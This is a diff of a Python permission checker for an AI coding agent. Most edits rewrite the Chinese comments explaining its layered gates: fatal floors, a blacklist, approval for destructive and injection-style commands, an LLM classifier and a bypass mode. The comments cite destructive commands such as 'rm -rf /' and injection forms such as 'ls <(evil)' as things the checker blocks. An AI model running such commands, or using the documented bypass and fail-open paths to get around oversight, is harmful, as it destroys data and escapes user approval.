+                              路径审批时弹出来问用户。callback 内部按字符串
+                              内容区分是命令还是路径(含 / 或 \\ 或 ~ 开头的是
+                              路径)。返回值除了 True/False 还可以是 "always"
+                              (总是允许,见 check_path)。
+            whitelist_file: 持久化命令白名单的 JSON 文件路径
+                            (如 ~/.OmniMate/approved_commands.json)。
+            paths_whitelist_file: 路径白名单 JSON(如 ~/.OmniMate/approved_paths.json)
+                                  ——用户批准过的写入路径,跨会话不再问。
+            mode: 权限模式,四种:
+                  - "default": 四道闸门全开(黑名单 + 破坏性审批 + 默认通过
+                    + 可选的 LLM 分类)。
                   - "bypassPermissions": 跳过闸门 1/2/3/4,直接放行所有命令;
-                    但仍保留闸门 0(自我保护 + fatal 硬底线)。
+                    但闸门 0(自我保护 + fatal 硬底线)仍然生效。
                     用于 Claude Code 兼容的 --dangerously-skip-permissions 场景。
-                  - "acceptEdits": cwd 内 safe-fs（mkdir/touch/mv/cp/rm/del）命令和
-                    cwd 内写入自动放行，其他命令走原闸门（fatal 底线 + 自我保护 +
-                    受保护路径仍生效）。适合 agent 连续编辑代码场景。
-                  - "autoDeny" (Task J): 所有需用户审批的命令直接拒（fail-closed）。
-                    用于 async 子代理（background=True）：用户不在场无法审批，
-                    借鉴 Claude Code `shouldAvoidPermissionPrompts: true`。
-                    保留 fatal 底线 + 黑名单 + 受保护路径（所有硬拒仍生效）；
-                    已批准命令（白名单缓存）仍可执行；
-                    其他破坏性命令（rm 等）一律 permission_denied。
-            hooks_registry: 可选的 HookRegistry，用于触发 PERMISSION_REQUEST /
-                           PERMISSION_DENIED 审计事件。fail-open：hook 异常不影响权限判断。
+                  - "acceptEdits": 工作目录内的文件操作命令(mkdir/touch/mv/cp/
+                    rm/del)和工作目录内写入自动放行,其他命令走原闸门(fatal
+                    底线 + 自我保护 + 受保护路径仍然生效)。适合 AI 连续编辑
+                    代码的场景。
+                  - "autoDeny" (Task J): 所有需要用户审批的命令直接拒
+                    (fail-closed,出错就拒绝而不是放行)。用于 async 子代理
+                    (主对话派出去的后台分身):用户不在场没法弹审批,
+                    借鉴 Claude Code 的 shouldAvoidPermissionPrompts。
+                    保留 fatal 底线 + 黑名单 + 受保护路径(所有硬拒仍生效);
+                    已批准命令(白名单缓存)仍可执行;
+                    其他破坏性命令(rm 等)一律 permission_denied。
+            hooks_registry: 可选的 HookRegistry,用来触发 PERMISSION_REQUEST /
+                           PERMISSION_DENIED 审计事件。fail-open:hook 出异常
+                           不影响权限判断本身。
         """
         self.approval_callback = approval_callback
-        # R30 审计 L13：白名单读改写/集合变更的锁（singleton checker 被主线程
-        # 审批与 async 子代理线程并发使用；RLock 因 _save_whitelist 在锁内被调）
+        # R30 审计 L13 加的锁:保护白名单的读改写(全局共享的 checker 会被
+        # 主线程审批和 async 子代理线程同时用;用 RLock 是因为 _save_whitelist
+        # 会在锁内被再次调用)
         self._wl_lock = threading.RLock()
-        self._approved = set()  # 会话内缓存（命令）
-        # CCAR14 Task 3: 会话级写入根目录审批缓存（check_path 闸门 3 白名单外，
-        # 用户批准一次后父目录进缓存，同目录后续写入不再询问）
+        self._approved = set()  # 会话内缓存(批过的命令)
+        # CCAR14 Task 3: 会话级"写入根目录"审批缓存(check_path 里白名单外的
+        # 写入,用户批一次,其父目录进缓存,同目录后续写入不再问)
         self._approved_write_roots: set = set()
         self._whitelist_file = whitelist_file
         self._persistent_whitelist = set()
-        self._persistent_prefixes: set = set()  # R25 #2：前缀规则（curated 派生）
+        self._persistent_prefixes: set = set()  # R25 #2:前缀规则(从 curated 表派生)
         if whitelist_file:
             self._load_whitelist()
-        # 路径白名单（write_file 等场景，用户批准过的写入路径）
+        # 路径白名单(write_file 等场景,用户批准过的写入路径)
         self._paths_whitelist_file = paths_whitelist_file
         self._approved_paths = set()
         if paths_whitelist_file:
             self._load_paths_whitelist()
-        # 权限模式（default / bypassPermissions / acceptEdits / autoDeny）
+        # 权限模式(default / bypassPermissions / acceptEdits / autoDeny)
         if mode not in ("default", "bypassPermissions", "acceptEdits", "autoDeny"):
             raise ValueError(f"非法 permission_mode: {mode}")
         self.mode = mode
-        # round3 D2 NEW: hooks registry 引用（可选，None=不触发审计 hook）
+        # round3 D2 新增: hooks registry 引用(可选,None 就不触发审计 hook)
         self._hooks_registry = hooks_registry
-        # OS 沙箱模式（off | on）；运行时通过 set_sandbox_mode() 切换
-        # 实际 wrapper 注入由 terminal_tool 负责（基于本字段的值决定走哪条路径）
+        # OS 沙箱模式(off | on);运行时用 set_sandbox_mode() 切换。
+        # 真正把沙箱 wrapper 包到命令上的是 terminal_tool(它读这个字段
+        # 决定走哪条路)
         self.sandbox_mode = "off"
-        # === P4.1 NEW: 闸门 4 注入点（aux_llm + config）===
-        # PermissionChecker 在 cli.py 比 aux_llm_router 先构造，所以用 provider
-        # 延迟注入（参考 hook_exec 的 _AUX_ROUTER_PROVIDER 同款 pattern）。
-        # 默认 None：闸门 4 完全跳过（向后兼容，默认 OFF）。
+        # === P4.1 新增: 闸门 4 的注入点(aux_llm + config)===
+        # 为什么用 provider(延迟取值函数)而不是直接传对象:PermissionChecker
+        # 在 cli.py 里比 aux_llm_router 先构造,拿不到现成实例(和 hook_exec
+        # 的 _AUX_ROUTER_PROVIDER 同一个套路)。默认 None:闸门 4 完全跳过
+        # (向后兼容,默认关)。
         self._aux_llm_provider: Optional[Callable[[], Any]] = None
         self._config_provider: Optional[Callable[[], Dict[str, Any]]] = None
-        # R21 #46：闸门 4 拒绝跟踪（连续/累计，达阈值回落人工）
+        # R21 #46:闸门 4 的拒绝计数(连续 + 累计,达到阈值就停用闸门 4
+        # 回落人工审批)
         self._llm_denial_consecutive = 0
         self._llm_denial_total = 0
 
     def set_aux_llm_provider(self, provider: Callable[[], Any]) -> None:
-        """注入 aux_llm_router provider（cli.py 在创建 aux_llm_router 后调）。
+        """注入副 LLM 路由的 provider(cli.py 创建好 aux_llm_router 后调用)。
 
-        provider 是个 callable，返回 AuxLLMRouter 实例或 None。
-        用 provider 而不是直接传 router，是因为 PermissionChecker 比 aux_llm_router
-        先构造（参考 hook_exec.set_aux_router_provider 同款 pattern）。
+        provider 是个函数,调用它返回 AuxLLMRouter 实例或 None。
+        为什么用 provider 而不直接传 router:PermissionChecker 比
+        aux_llm_router 先构造,当时还没有实例(和 hook_exec 的
+        set_aux_router_provider 同一个套路)。
+
+        参数:
+            provider: 无参函数,返回 AuxLLMRouter 实例或 None。
         """
         self._aux_llm_provider = provider
 
     def set_config_provider(self, provider: Callable[[], Dict[str, Any]]) -> None:
-        """注入 config provider（cli.py 在 RuntimeContext 构造完后调）。
+        """注入 config provider(cli.py 在 RuntimeContext 组装完后调用)。
 
-        provider 是个 callable，返回 config dict 或 None。
-        闸门 4 需要读 config.features.bash_llm_classifier 判断开关 + 白名单。
+        provider 是个函数,返回 config 字典或 None。
+        为什么需要:闸门 4 要读 config.features.bash_llm_classifier 判断
+        开关状态和白名单。
+
+        参数:
+            provider: 无参函数,返回 config dict 或 None。
         """
         self._config_provider = provider
 
     def _readonly_fastpath_enabled(self) -> bool:
-        """T7：只读快速通道开关（config security.readonly_fastpath_enabled，默认 True）。"""
+        """T7:只读快速通道的开关(config security.readonly_fastpath_enabled,默认开)。
+
+        返回:True 表示启用。读不到配置时也返回 True(fail-open,
+        读不到配置就按默认值来,别把功能弄没了)。
+        """
         if self._config_provider is None:
             return True
         try:
@@ -1165,13 +1380,20 @@ class PermissionChecker:
             sec = config.get("security") or {}
             return bool(sec.get("readonly_fastpath_enabled", True))
         except Exception:
-            return True  # fail-open：读不到配置默认开
+            return True  # fail-open:读不到配置默认开
 
     def _deny(self, command: str, reason: str, deny_type: str = "deny") -> "PermissionResult":
-        """round3 D2 NEW: 统一 deny helper。
+        """round3 D2 新增:统一的拒绝 helper。
 
-        触发 PERMISSION_DENIED 审计 hook（fail-open）后返回 PermissionResult(False)。
-        所有 check() 的拒绝路径都走这个 helper，保证审计事件不遗漏。
+        干什么:所有"拒绝"都从这儿出——先触发 PERMISSION_DENIED 审计 hook
+        (hook 出错不影响拒绝本身,fail-open),再返回 PermissionResult(False)。
+
+        为什么统一走它:保证审计事件不会漏(哪个关卡拒的都有记录可查)。
+
+        参数:
+            command: 被拒的命令(或路径字符串)。
+            reason: 拒绝原因。
+            deny_type: 拒绝类型标签(如 "deny"/"protected"/"auto_deny")。
         """
         if self._hooks_registry is not None:
             try:
@@ -1181,11 +1403,11 @@ class PermissionChecker:
                     "deny_type": deny_type,
                 })
             except Exception:
-                pass  # fail-open：hook 异常不影响权限判断
+                pass  # fail-open:hook 出异常不影响权限判断本身
         return PermissionResult(False, reason, deny_type)
 
     def _load_whitelist(self):
-        """加载持久化白名单。"""
+        """从 JSON 文件加载持久化命令白名单(含前缀规则);读失败只记 debug 日志不崩。"""
         if not self._whitelist_file:
             return
         try:
@@ -1193,18 +1415,20 @@ class PermissionChecker:
             if path.exists():
                 data = json.loads(path.read_text(encoding="utf-8"))
                 self._persistent_whitelist = set(data.get("commands", []))
-                # R25 #2：前缀规则（旧文件无此键 → 空集，向后兼容）
+                # R25 #2:前缀规则(旧格式文件没这个键 → 读成空集,向后兼容)
                 self._persistent_prefixes = set(data.get("prefixes", []))
                 logger.info("加载 %d 条已批准命令", len(self._persistent_whitelist))
         except Exception as e:
             logger.debug("加载白名单失败: %s", e)
 
     def _save_whitelist(self):
-        """保存持久化白名单（原子写；L13：快照+写盘整段加锁）。
+        """把持久化白名单写回 JSON 文件（原子写；L13：快照+写盘整段加锁）。
 
-        只锁快照不够：rename 顺序可以晚于更早的快照（T 先快照、慢慢写盘，
-        Y 加条目后先 rename，T 的旧快照再 rename 覆盖 → Y 丢更新）。
-        锁住快照到 rename 的整段，save 之间全序，后写者快照必含全部前序 add。
+        历史踩坑（L13）：只锁"拍快照"那一下不够——rename 的落盘时机可能
+        晚于别人更早的快照。场景：线程 T 拍了快照慢慢写盘，线程 Y 这时
+        加了条目并先落盘，T 的旧快照随后落盘把 Y 的更新覆盖 → Y 白加了。
+        所以要把"快照到 rename"整段锁住，让所有 save 排成全序，
+        后写者的快照必然包含前序 add 的全部内容。
         """
         if not self._whitelist_file:
             return
@@ -1223,7 +1447,7 @@ class PermissionChecker:
             logger.debug("保存白名单失败: %s", e)
 
     def _load_paths_whitelist(self):
-        """加载路径白名单。"""
+        """从 JSON 文件加载路径白名单(用户批过的写入路径);读失败只记 debug 日志。"""
         if not self._paths_whitelist_file:
             return
         try:
@@ -1236,7 +1460,7 @@ class PermissionChecker:
             logger.debug("加载路径白名单失败: %s", e)
 
     def _save_paths_whitelist(self):
-        """保存路径白名单（原子写）。"""
+        """把路径白名单写回 JSON 文件(原子写;写失败只记 debug 日志)。"""
         if not self._paths_whitelist_file:
             return
         try:
@@ -1262,33 +1486,48 @@ class PermissionChecker:
         no_callback_message: str,
         gate: str,
     ) -> PermissionResult:
-        """统一审批闸门（R16 #1 抽取；破坏性命令与注入面形态共用）。
+        """统一审批闸门(R16 #1 抽出来的公共函数;破坏性命令和注入面形态共用)。
 
-        流程与原破坏性审批块逐行等价：
-        持久化白名单/会话缓存命中放行 → autoDeny 短路拒（async 子代理
-        不能弹审批 UI）→ 无 callback 拒 → PERMISSION_REQUEST hook + toast →
-        callback 审批 → 拒绝/批准（批准入会话缓存 + 持久化白名单）。
+        干什么:所有"要问用户"的场景都走这一套流程(和原来破坏性审批块
+        逐行等价,只是抽成了函数):
+        持久化白名单/会话缓存命中 → 直接放行;
+        autoDeny 模式 → 短路拒绝(async 子代理不能弹审批窗口);
+        没配审批 callback → 拒;
+        然后触发 PERMISSION_REQUEST 审计 hook + 桌面 toast 通知;
+        调 callback 问用户 → 拒绝就拒,批准就进会话缓存 + 持久化白名单
+        (还会试着派生前缀规则)。
+
+        参数：
+            command: 待审批的命令。
+            effective_mode: 本次生效的权限模式(autoDeny 判断要用)。
+            hook_reason: 审计 hook 里记的审批原因。
+            auto_deny_reason: autoDeny 拒绝时给的原因。
+            no_callback_message: 没配 callback 时的拒绝消息。
+            gate: 结果里的关卡标签(如 "destructive"/"injection")。
+
+        返回:PermissionResult。
         """
         cmd_key = command.strip()
 
-        # 先检查持久化白名单 + 会话缓存
+        # 先查持久化白名单和会话缓存(批过就放)
         if cmd_key in self._persistent_whitelist or cmd_key in self._approved:
             return PermissionResult(True, "已批准（白名单）", "approval")
 
-        # R25 #2：前缀规则命中（词边界：cmd == p 或 cmd 以 "p " 开头）。
-        # 复合操作符/重定向命令不走前缀免审（防前半段匹配掩护后半段）
+        # R25 #2:前缀规则命中(词边界:cmd == p 或 cmd 以 "p " 开头)。
+        # 带复合操作符/重定向的命令不走前缀免审(防前半段匹配掩护后半段)
         from agent.command_prefix import is_prefix_match_safe
         if is_prefix_match_safe(cmd_key):
             for p in self._persistent_prefixes:
                 if cmd_key == p or cmd_key.startswith(p + " "):
                     return PermissionResult(True, "已批准（前缀规则）", "approval")
 
-        # auto_deny 短路（fail-closed）：
-        # - fatal 底线（rm -rf / 等）已在闸门 0 拒绝，不会走到这里
-        # - 黑名单（sudo 等）已在闸门 1 拒绝，不会走到这里
-        # - 必须用 effective_mode——singleton checker（get_default_checker()
-        #   返回的共享实例）的 self.mode 永远是 "default"，子代理的 autoDeny
-        #   通过 mode_override 传入，只有 effective_mode 能反映真实模式。
+        # autoDeny 短路(fail-closed,直接拒):
+        # - fatal 底线(rm -rf / 等)在闸门 0 已经拒了,走不到这里
+        # - 黑名单(sudo 等)在闸门 1 已经拒了,走不到这里
+        # - 历史踩坑:必须用 effective_mode——全局共享的那个 checker
+        #   (get_default_checker() 返回的实例)的 self.mode 永远是 "default",
+        #   子代理的 autoDeny 是通过 mode_override 传进来的,只有
+        #   effective_mode 能反映真实模式。
         if effective_mode == "autoDeny":
             return self._deny(
                 command,
@@ -1299,7 +1538,7 @@ class PermissionChecker:
         if self.approval_callback is None:
             return self._deny(command, no_callback_message, gate)
 
-        # PERMISSION_REQUEST 审计（进入用户审批前；fail-open）
+        # PERMISSION_REQUEST 审计(弹窗问用户之前记一笔;hook 出错不影响)
         if self._hooks_registry is not None:
             try:
                 self._hooks_registry.run_permission_request({
@@ -1307,9 +1546,9 @@ class PermissionChecker:
                     "reason": hook_reason,
                 })
             except Exception:
-                pass  # fail-open
+                pass  # fail-open:hook 出错不影响审批流程
 
-        # 桌面通知——用户可能没盯屏幕，弹 toast 提醒审批（fail-open）
+        # 桌面通知——用户可能没盯着屏幕,弹个 toast 提醒有审批在等(失败不拦)
         try:
             from agent.notifier import notify as _notify
             _notify("需要审批", "agent 请求执行命令")
@@ -1324,12 +1563,13 @@ class PermissionChecker:
         if not approved:
             return self._deny(command, "用户拒绝", "approval")
 
-        # 批准：加入会话缓存 + 持久化白名单（L13：整段加锁，防并发审批下
-        # 前缀/命令交错写入不一致）
+        # 用户批了:进会话缓存 + 持久化白名单(L13:整段加锁,防并发审批下
+        # 前缀/命令交错写入造成不一致)
         with self._wl_lock:
             self._approved.add(cmd_key)
             self._persistent_whitelist.add(cmd_key)
-            # R25 #2：curated 表可泛化 → 额外存前缀规则（同类测试命令不再询问）
+            # R25 #2:curated 表里可泛化的命令 → 额外存一条前缀规则
+            # (同类跑测试的命令下次不再问)
             from agent.command_prefix import derive_approved_prefix
             try:
                 prefix = derive_approved_prefix(cmd_key)
@@ -1348,18 +1588,26 @@ class PermissionChecker:
         *,
         mode_override: Optional[str] = None,
     ) -> PermissionResult:
-        """检查命令是否允许执行。
+        """检查一条命令是否允许执行——整个权限系统的主入口。
+
+        干什么:按顺序过完模块头说的那串关卡,给出放行/拒绝/需审批的结论。
 
         参数：
-            mode_override: 可选的 mode 覆盖（"default" / "bypassPermissions"）。
-                          优先于 self.mode，用于子代理按 agent_ref.permission_mode
-                          做决策，而不污染全局 checker 状态（线程安全）。
+            command: 待检查的 shell 命令。
+            cwd: 当前工作目录(自我保护检查要用;不传由各检查自定默认)。
+            mode_override: 可选的模式覆盖("default"/"bypassPermissions"/
+                          "acceptEdits"/"autoDeny"),优先于 self.mode。
+                          为什么需要:子代理(分身)按自己定义里的权限模式
+                          做决策时,不能去改全局共享 checker 的 self.mode
+                          (那会影响别的线程,不安全),所以每次调用临时传。
+
+        返回:PermissionResult(allowed/reason/gate)。
         """
-        # 决定本次 check 使用的 effective mode（override 优先）
+        # 本次 check 用哪个模式(override 优先)
         effective_mode = mode_override or self.mode
 
-        # 闸门 0:不可绕过的底线（自我保护 + 系统级 fatal）
-        # 这两道检查在任何 mode（包括 bypassPermissions）下都执行
+        # 闸门 0:绕不过去的底线(自我保护 + 系统级 fatal)
+        # 这两道检查在任何模式下(包括 bypassPermissions)都执行
         self_violation = check_self_modification(command, cwd)
         if self_violation:
             return self._deny(command, f"自我保护: {self_violation}", "deny")
@@ -1367,11 +1615,11 @@ class PermissionChecker:
         if fatal:
             return self._deny(command, f"硬底线: {fatal}", "deny")
 
-        # === R16 #3：内容级权限规则（Bash(cmd:*) 语法，deny > ask > allow）===
-        # deny：任何模式都拒（含 bypass——用户显式 deny 是最高意图）
-        # ask：强制审批（bypass 也不豁免，对齐 CC 内容级 ask 语义）
-        # allow：标记 content_allowed，跳过后续注入面/破坏性审批
-        #        （硬底线已在闸门 0 拒掉；黑名单/危险删除在后面仍生效）
+        # === R16 #3:内容级权限规则(Bash(cmd:*) 写法,优先级 deny > ask > allow)===
+        # deny:任何模式都拒(含 bypass——用户显式 deny 是最高意图)
+        # ask:强制审批(bypass 也不豁免,对齐 CC 内容级 ask 语义)
+        # allow:标记 content_allowed,后面跳过注入面/破坏性审批
+        #        (硬底线已在闸门 0 拒掉;黑名单/危险删除在后面仍然生效)
         from agent.tool_permissions import check_command_rules
         content_rule = check_command_rules(command)
         if content_rule == "deny":
@@ -1387,38 +1635,40 @@ class PermissionChecker:
             )
         content_allowed = content_rule == "allow"
 
-        # bypassPermissions 模式:跳过闸门 1/2/3,直接放行剩余所有命令
+        # bypassPermissions 模式:跳过闸门 1/2/3,剩下所有命令直接放行
         # 适用场景:Claude Code 兼容的 --dangerously-skip-permissions,
         # 用户已明确接受风险,不需要审批。闸门 0 的两道底线仍生效。
-        # （R16 #3 的内容级 deny/ask 在上面已先行处理——bypass 不豁免它们）
+        # (R16 #3 的内容级 deny/ask 上面已经先处理了——bypass 不豁免它们)
         if effective_mode == "bypassPermissions":
             return PermissionResult(True, "bypassPermissions 模式放行", "bypass")
 
-        # === R16 #6：危险删除路径（任何非 bypass 模式默认拒，不可审批解锁）===
-        # rm/del 目标为 * / 根 / 家 / 根直接子目录 / 盘根(直接子目录) → 拒。
-        # 必须在 acceptEdits 之前：rm 在 SAFE_FS 动词表里，否则 "rm -rf *" 会
-        # 被 cwd 内 safe-fs 自动放行。
+        # === R16 #6:危险删除路径(任何非 bypass 模式默认拒,审批也解不了锁)===
+        # rm/del 的目标是 * / 根 / 家 / 根直接子目录 / 盘根(直接子目录) → 拒。
+        # 为什么必须排在 acceptEdits 之前:rm 在 SAFE_FS 动词表里,
+        # 不先查的话 "rm -rf *" 会被"cwd 内文件操作自动放行"给放过去。
         dangerous_rm = check_dangerous_removal(command, cwd)
         if dangerous_rm:
             return self._deny(command, f"危险删除: {dangerous_rm}", "deny")
 
-        # acceptEdits: safe-fs 命令在 cwd 内自动放行；其他命令走原闸门
+        # acceptEdits: cwd 内的文件操作命令自动放行;其他命令走原闸门
         if effective_mode == "acceptEdits" and _is_safe_fs_in_cwd(command, cwd):
             return PermissionResult(True, "acceptEdits: safe-fs in cwd", "auto")
 
-        # 闸门 1：硬拒绝
+        # 闸门 1:硬拒绝(黑名单)
         deny = check_command_deny(command)
         if deny:
             return self._deny(command, f"硬拒绝: {deny}", "deny")
 
-        # === R16 #3：内容级 allow 命中 → 放行（硬底线/黑名单已在前拒掉）===
+        # === R16 #3:内容级 allow 命中 → 放行(硬底线/黑名单前面已拒掉)===
         if content_allowed:
             return PermissionResult(True, "内容级规则允许（permissions.allow）", "rule_allow")
 
-        # === R16 #1：注入面模式（命中 → 升审批，不硬拒）===
-        # $()/${}/进程替换/zsh 展开/IFS/控制字符等"所见非所执行"形态，
-        # 对齐 CCB bashSecurity 的 ask 语义（模块头有与 CC 的差异说明）。
-        # 必须先于只读快速通道：ls <(evil) 不能被只读通道自动放行。
+        # === R16 #1:注入面形态(命中 → 升审批,不是硬拒)===
+        # $()/${}/进程替换/zsh 展开/IFS/控制字符等"所见非所执行"的形态——
+        # 你看到的命令字符串和 shell 实际执行的东西可能不一样。
+        # 对齐 CCB bashSecurity 的 ask 语义(所见非所执行 ≠ 攻击,所以问
+        # 而不是拒;与 CC 的差异说明在 bash_injection.py 模块头)。
+        # 为什么必须排在只读快速通道之前:ls <(evil) 不能被只读通道自动放行。
         injection = check_injection_surface(command)
         if injection:
             return self._approval_gate(
@@ -1430,8 +1680,8 @@ class PermissionChecker:
                 gate="injection",
             )
 
-        # === R30g-M2：复合命令段数上限（DoS 防护）===
-        # 超宽复合命令不进任何解析路径，直接升审批
+        # === R30g-M2:复合命令段数上限(防 DoS)===
+        # 超长的复合命令不进任何解析路径,直接升审批
         if len(_CMD_SEGMENT_SPLIT_RE.split(command)) > _MAX_COMPOUND_SEGMENTS:
             return self._approval_gate(
                 command,
@@ -1442,7 +1692,7 @@ class PermissionChecker:
                 gate="too_many_segments",
             )
 
-        # === R30g-M3：cd+git 组合（bare-repo RCE 防护，对齐 CCB）===
+        # === R30g-M3:cd+git 组合(防恶意裸仓库远程执行代码,对齐 CCB)===
         if _has_cd_git_combo(command):
             return self._approval_gate(
                 command,
@@ -1453,15 +1703,15 @@ class PermissionChecker:
                 gate="cd_git",
             )
 
-        # === T7：只读快速通道（自动批，在破坏性审批与 LLM 分类器之前）===
-        # git status/ls/cat 等只读命令零打扰放行（也跳过闸门 4 的 LLM 调用）。
-        # 顺序在闸门 1 之后：黑名单永远先于快速通道（fatal 底线更早在闸门 0）。
-        # config security.readonly_fastpath_enabled=False 可关（默认 True）。
+        # === T7:只读快速通道(自动批,排在破坏性审批和 LLM 分类器之前)===
+        # git status/ls/cat 这些只读命令零打扰放行(也跳过闸门 4 的 LLM 调用)。
+        # 为什么排在闸门 1 之后:黑名单永远比快速通道先判(fatal 底线更早在闸门 0)。
+        # config 里 security.readonly_fastpath_enabled=False 可关(默认开)。
         if self._readonly_fastpath_enabled():
             if _is_readonly_command(command):
                 return PermissionResult(True, "只读快速通道（readonly fastpath）", "auto")
 
-        # 闸门 2：破坏性命令（需要审批；R16 #1 起与注入面共用 _approval_gate）
+        # 闸门 2:破坏性命令(要审批;R16 #1 起和注入面共用 _approval_gate)
         destructive = check_destructive(command)
         if destructive:
             return self._approval_gate(
@@ -1473,45 +1723,48 @@ class PermissionChecker:
                 gate="destructive",
             )
 
-        # 闸门 4：aux_llm 分类（feature flag 门控，默认 OFF）
-        # 前三道闸门都没拒绝也没要求审批的命令（非黑名单、非破坏性），
-        # 由 aux_llm 再做一次语义判断。白名单快速通道跳过 LLM 调用。
-        # fail-open：feature 关闭 / 未注入 provider / LLM 调用失败 → 放行。
+        # 闸门 4:副 LLM 分类(feature flag 控制开关,默认关)
+        # 走到这里说明前三道闸门都没拒绝也没要求审批(非黑名单、非破坏性),
+        # 让副 LLM 从语义上再判一次。白名单命令跳过 LLM 调用。
+        # fail-open:feature 关着 / 没注入 provider / LLM 调用失败 → 放行。
         result = self._check_llm_classifier(command, effective_mode)
         if result is not None:
             return result
 
-        # 闸门 3：默认通过
+        # 闸门 3:默认通过
         return PermissionResult(True, "ok", "ok")
 
     def _check_llm_classifier(
         self, command: str, effective_mode: str
     ) -> Optional[PermissionResult]:
-        """闸门 4 实现：调 aux_llm 分类命令。
+        """闸门 4 的实现:调副 LLM 给命令做安全分类。
 
-        R26 #11：三向 verdict（allow/deny/ask）——ask 升审批不直接拒；
-        自然语言规则 permissions.nl_rules 注入分类 prompt。
+        R26 #11:分类结果三向(allow 放行/deny 拒绝/ask 升人工审批——
+        拿不准问人,不直接拒);settings.json permissions.nl_rules 里的
+        自然语言规则会拼进分类提示词。
 
-        Args:
-            command: 要分类的命令
-            effective_mode: 本次 check 的生效权限模式（ask 分支 _approval_gate
-                需要——autoDeny 短路 / singleton checker 线程安全语义）
+        参数:
+            command: 要分类的命令。
+            effective_mode: 本次 check 的生效权限模式(ask 分支调
+                _approval_gate 要用——autoDeny 短路、全局共享 checker 的
+                线程安全语义都靠它)。
 
-        Returns:
-            PermissionResult：放行 / 拒绝 / 审批结果
-            None：闸门 4 未启用或 fail-open 放行交给闸门 3 处理（向后兼容）
+        返回:
+            PermissionResult:放行/拒绝/审批的结论;
+            None:闸门 4 没启用,或 fail-open 放行(交给闸门 3 默认通过,
+            向后兼容老行为)。
         """
-        # 1) 检查 provider 是否注入（默认 None → 跳过）
+        # 1) provider 没注入(默认 None)→ 闸门 4 整个跳过
         if self._config_provider is None or self._aux_llm_provider is None:
             return None
 
-        # R21 #46：拒绝回落——连续 3 次或累计 20 次判 unsafe → 本会话停用闸门 4
-        # （分类器与用户意图不合拍，回落人工审批比反复误拒好）
+        # R21 #46 的拒绝回落:连续 3 次或累计 20 次判 unsafe → 本会话停用
+        # 闸门 4(分类器明显和用户意图不合拍了,回落人工审批比反复误拒强)
         if (self._llm_denial_consecutive >= LLM_DENIAL_MAX_CONSECUTIVE
                 or self._llm_denial_total >= LLM_DENIAL_MAX_TOTAL):
             return None
 
-        # 2) 读 config + feature flag
+        # 2) 读 config,看 feature flag 开没开
         try:
             config = self._config_provider() or {}
         except Exception as e:
@@ -1524,12 +1777,12 @@ class PermissionChecker:
             return None
 
         if not is_feature_enabled(config, "bash_llm_classifier"):
-            return None  # feature 关闭 → 跳过
+            return None  # feature 关着 → 跳过
 
-        # 3) 白名单快速通道（0 LLM 调用）
-        # R21 #46：危险前缀剥离——解释器/runner/eval 类白名单条目会让分类器
-        # 形同虚设（python -c 可执行任意代码），这类条目不进快速通道
-        # （不修改 config，只在闸门 4 内忽略——命令仍走正常分类）。
+        # 3) 白名单快速通道(0 次 LLM 调用)
+        # R21 #46 的危险前缀剥离:解释器/runner/eval 类的白名单条目会让
+        # 分类器形同虚设(python -c 能执行任意代码),这类条目不给开快速通道
+        # (不改用户的 config,只在闸门 4 内忽略——命令仍走正常分类)。
         cfg = get_feature_config(config, "bash_llm_classifier")
         raw_whitelist = cfg.get("whitelist", [])
         whitelist = [
@@ -1539,18 +1792,19 @@ class PermissionChecker:
         if _matches_whitelist(command, whitelist):
             return PermissionResult(True, "白名单快速通道", "whitelist")
 
-        # 4) 调 aux_llm 分类（async → sync 用 asyncio.run 桥接）
+        # 4) 调副 LLM 分类(async 接口 → 用 asyncio.run 桥接到同步)
         try:
             aux_llm = self._aux_llm_provider()
         except Exception as e:
             logger.warning("bash_llm_classifier: aux_llm provider 异常（fail-open）: %s", e)
-            return None  # fail-open：交给闸门 3 放行
+            return None  # fail-open:交给闸门 3 放行
 
         if aux_llm is None:
-            # provider 返回 None（aux_llm 未配置）→ fail-open
+            # provider 返回 None(副 LLM 没配置)→ fail-open
             return None
 
-        # R26 #11：nl_rules 注入（settings.json permissions.nl_rules，自然语言规则）
+        # R26 #11:nl_rules 注入(settings.json permissions.nl_rules 里的
+        # 自然语言规则,如"不允许动 docker")
         try:
             nl_rules = (config.get("permissions") or {}).get("nl_rules") or []
             aux_llm.nl_rules_cache = [str(r) for r in nl_rules]
@@ -1560,10 +1814,11 @@ class PermissionChecker:
         try:
             verdict = asyncio.run(_classify_bash_command(command, aux_llm))
         except RuntimeError as e:
-            # R30 审计 Medium-9：async 上下文（已有事件循环）直调 check 时
-            # asyncio.run 抛 RuntimeError——此前直接 fail-open 跳过分类，安全层
-            # 在该执行路径无声消失。降级为工作线程独立事件循环执行（阻塞等待，
-            # 保持 check() 的同步契约）；仍失败才 fail-open。
+            # 历史踩坑(R30 审计 Medium-9):在 async 上下文里(已经有事件循环
+            # 在跑)直接调 check,asyncio.run 会抛 RuntimeError——之前碰到这
+            # 个异常直接 fail-open 跳过分类,等于安全层在那条执行路径上无声
+            # 消失了。修复:降级到独立工作线程里跑事件循环(阻塞等结果,
+            # 保住 check() 的同步契约);还不行才 fail-open。
             logger.warning(
                 "bash_llm_classifier: 事件循环线程直调，转工作线程执行: %s", e,
             )
@@ -1583,17 +1838,17 @@ class PermissionChecker:
             logger.warning("bash_llm_classifier: 分类调用异常（fail-open）: %s", e)
             return None
 
-        # 调用失败 → fail-open 放行（交给闸门 3）
+        # 调用失败 → fail-open 放行(交给闸门 3 默认通过)
         if "error" in verdict:
             return None
 
-        # R26 #11：三向 verdict 分发（allow 放行 / ask 升审批 / deny 拒绝）
+        # R26 #11:三向结果分发(allow 放行 / ask 升审批 / deny 拒绝)
         v = verdict.get("verdict")
         if v == "allow":
             self._llm_denial_consecutive = 0
             return PermissionResult(True, "aux_llm 判允许", "llm_safe")
         if v == "ask":
-            # R26 #11：拿不准 → 升审批（不直接拒）
+            # R26 #11:拿不准 → 升人工审批(不直接拒)
             return self._approval_gate(
                 command,
                 effective_mode,
@@ -1603,8 +1858,8 @@ class PermissionChecker:
                 gate="llm_ask",
             )
 
-        # AI 判 deny → 拒绝 + 原因
-        # R21 #46：拒绝计数（连续 +1，累计 +1）
+        # AI 判 deny → 拒绝并给原因
+        # R21 #46:拒绝计数(连续 +1,累计 +1;到阈值停用闸门 4)
         self._llm_denial_consecutive += 1
         self._llm_denial_total += 1
         if (self._llm_denial_consecutive >= LLM_DENIAL_MAX_CONSECUTIVE
@@ -1628,38 +1883,47 @@ class PermissionChecker:
         allowed_roots: Optional[List] = None,
         mode_override: Optional[str] = None,
     ) -> PermissionResult:
-        """检查文件路径是否可访问。
+        """检查一个文件路径是否允许访问(写文件工具走这里,带审批;函数版是 safe_path)。
 
